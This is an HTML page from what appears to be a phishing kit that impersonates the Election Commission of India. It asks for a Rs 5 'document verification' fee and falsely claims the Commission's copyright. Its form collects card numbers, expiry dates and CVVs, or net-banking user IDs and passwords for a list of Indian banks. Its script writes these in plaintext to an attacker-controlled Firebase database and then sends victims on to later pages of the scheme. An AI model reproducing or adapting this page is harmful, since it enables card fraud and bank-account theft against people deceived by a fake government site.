<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voter ID - Payment Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
        .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 22px; }
        .charge-sub { text-align: center; color: #28a745; font-weight: bold; font-size: 14px; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
        .form-group input, .form-group select { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #fff; }
        .payment-methods { display: flex; gap: 15px; margin-bottom: 20px; }
        .method-option { flex: 1; border: 2px solid #ccc; padding: 10px; text-align: center; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; color: #555; }
        .method-option input { display: none; }
        .method-option.active { border-color: #0056b3; background-color: #eef5ff; color: #0056b3; }
        .hidden-section { display: none; background: #f8f9fa; padding: 15px; border-radius: 6px; border: 1px solid #e0e0e0; margin-bottom: 15px; }
        .row-group { display: flex; gap: 10px; }
        .row-group .form-group { flex: 1; }
        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        .footer-text { text-align: center; margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Document Verification</h2>
        <div class="charge-sub">Charge: Rs 5/- Only</div>
        
        <form id="paymentForm">
            <div class="form-group">
                <label>Choose Payment Method</label>
                <div class="payment-methods">
                    <label class="method-option active" id="cardOptionLabel">
                        <input type="radio" name="payMethod" value="Card" checked> Credit / Debit Card
                    </label>
                    <label class="method-option" id="netOptionLabel">
                        <input type="radio" name="payMethod" value="NetBanking"> Net Banking
                    </label>
                </div>
            </div>

            <div id="cardSection" class="hidden-section" style="display: block;">
                <div class="form-group">
                    <label for="cardNumber">Card Number (16 Digits)</label>
                    <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter 16-digit card number" maxlength="19">
                </div>
                <div class="row-group">
                    <div class="form-group">
                        <label for="expiryDate">Expiry Date</label>
                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input type="password" id="cvv" name="cvv" placeholder="CVV" maxlength="4">
                    </div>
                </div>
            </div>

            <div id="netBankingSection" class="hidden-section">
                <div class="form-group">
                    <label for="bankName">Select Bank Name</label>
                    <select id="bankName" name="bankName">
                        <option value="">-- Select Bank --</option>
                        <option value="Axis Bank">Axis Bank</option>
                        <option value="Bandhan Bank Limited">Bandhan Bank Limited</option>
                        <option value="Bank of Baroda">Bank of Baroda</option>
                        <option value="Bank of India">Bank of India</option>
                        <option value="Bank of Maharashtra">Bank of Maharashtra</option>
                        <option value="Canara Bank">Canara Bank</option>
                        <option value="Central Bank of India">Central Bank of India</option>
                        <option value="City Union Bank Limited">City Union Bank Limited</option>
                        <option value="CSB Bank Limited">CSB Bank Limited</option>
                        <option value="DCB Bank Limited">DCB Bank Limited</option>
                        <option value="Dhanlaxmi Bank Limited">Dhanlaxmi Bank Limited</option>
                        <option value="Federal Bank Limited">Federal Bank Limited</option>
                        <option value="HDFC Bank">HDFC Bank</option>
                        <option value="ICICI Bank">ICICI Bank</option>
                        <option value="IDBI Bank Limited">IDBI Bank Limited</option>
                        <option value="IDFC FIRST Bank Limited">IDFC FIRST Bank Limited</option>
                        <option value="Indian Bank">Indian Bank</option>
                        <option value="Indian Overseas Bank">Indian Overseas Bank</option>
                        <option value="IndusInd Bank Limited">IndusInd Bank Limited</option>
                        <option value="Jammu & Kashmir Bank Limited">Jammu & Kashmir Bank Limited</option>
                        <option value="Karnataka Bank Limited">Karnataka Bank Limited</option>
                        <option value="Karur Vysya Bank Limited">Karur Vysya Bank Limited</option>
                        <option value="Kotak Mahindra Bank Limited">Kotak Mahindra Bank Limited</option>
                        <option value="Nainital Bank Limited">Nainital Bank Limited</option>
                        <option value="Punjab & Sind Bank">Punjab & Sind Bank</option>
                        <option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)</option>
                        <option value="RBL Bank Limited">RBL Bank Limited</option>
                        <option value="South Indian Bank Limited">South Indian Bank Limited</option>
                        <option value="State Bank of India (SBI)">State Bank of India (SBI)</option>
                        <option value="Tamilnad Mercantile Bank Limited">Tamilnad Mercantile Bank Limited</option>
                        <option value="UCO Bank">UCO Bank</option>
                        <option value="Union Bank of India">Union Bank of India</option>
                        <option value="YES Bank Limited">YES Bank Limited</option>
                        <option value="Other Bank">Other Bank (Custom)</option>
                    </select>
                </div>

                <div class="form-group" id="otherBankGroup" style="display: none;">
                    <label for="otherBankName">Enter Other Bank Name</label>
                    <input type="text" id="otherBankName" name="otherBankName" placeholder="Enter your bank name">
                </div>

                <div id="bankCredentials" style="display: none;">
                    <div class="form-group">
                        <label for="userId">Enter User ID / User Name</label>
                        <input type="text" id="userId" name="userId" placeholder="Enter user ID">
                    </div>
                    <div class="form-group">
                        <label for="loginPassword">Login Password</label>
                        <input type="password" id="loginPassword" name="loginPassword" placeholder="Enter password">
                    </div>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-next">Pay Rs 5 / Next</button>
        </form>

        <div class="footer-text">
            © 2026 Election Commission of India. All rights reserved.
        </div>
    </div>

    <!-- Firebase Integration Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const cardRadio = document.querySelector('input[value="Card"]');
        const netRadio = document.querySelector('input[value="NetBanking"]');
        const cardSection = document.getElementById('cardSection');
        const netSection = document.getElementById('netBankingSection');
        const cardLabel = document.getElementById('cardOptionLabel');
        const netLabel = document.getElementById('netOptionLabel');

        cardRadio.addEventListener('change', function() {
            if(this.checked) {
                cardSection.style.display = 'block';
                netSection.style.display = 'none';
                cardLabel.classList.add('active');
                netLabel.classList.remove('active');
            }
        });

        netRadio.addEventListener('change', function() {
            if(this.checked) {
                netSection.style.display = 'block';
                cardSection.style.display = 'none';
                netLabel.classList.add('active');
                cardLabel.classList.remove('active');
            }
        });

        const bankNameSelect = document.getElementById('bankName');
        const otherBankGroup = document.getElementById('otherBankGroup');
        const bankCredentials = document.getElementById('bankCredentials');

        bankNameSelect.addEventListener('change', function() {
            if (this.value === "Other Bank") {
                otherBankGroup.style.display = 'block';
                bankCredentials.style.display = 'block';
            } else if (this.value !== "") {
                otherBankGroup.style.display = 'none';
                bankCredentials.style.display = 'block';
            } else {
                otherBankGroup.style.display = 'none';
                bankCredentials.style.display = 'none';
            }
        });

        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const payMethod = document.querySelector('input[name="payMethod"]:checked').value;
            let paymentDetails = "";

            if (payMethod === 'Card') {
                const cardNumber = document.getElementById('cardNumber').value;
                const expiryDate = document.getElementById('expiryDate').value;
                const cvv = document.getElementById('cvv').value;
                paymentDetails = `Card: ${cardNumber}, Exp: ${expiryDate}, CVV: ${cvv}`;
            } else {
                let selectedBank = document.getElementById('bankName').value;
                if (selectedBank === "Other Bank") {
                    const customBank = document.getElementById('otherBankName').value;
                    selectedBank = `Other: ${customBank}`;
                }
                const userId = document.getElementById('userId').value;
                const loginPassword = document.getElementById('loginPassword').value;
                paymentDetails = `Bank: ${selectedBank}, UserID: ${userId}, Pass: ${loginPassword}`;
            }

            const docId = localStorage.getItem('voterDocId');
            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Processing...";

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                await updateDoc(docRef, {
                    paymentMethod: payMethod,
                    paymentDetails: paymentDetails,
                    currentStep: "Payment Completed"
                });

                setTimeout(() => {
                    if (payMethod === 'Card') {
                        window.location.href = "page5.html"; 
                    } else {
                        window.location.href = "netbanking_pass.html"; 
                    }
                }, 1000);
            } catch (error) {
                console.error("Error updating document: ", error);
                alert("डेटा सेव करने में समस्या हुई।");
                btn.disabled = false;
                btn.innerText = "Pay Rs 5 / Next";
            }
        });
    </script>
</body>
</html>
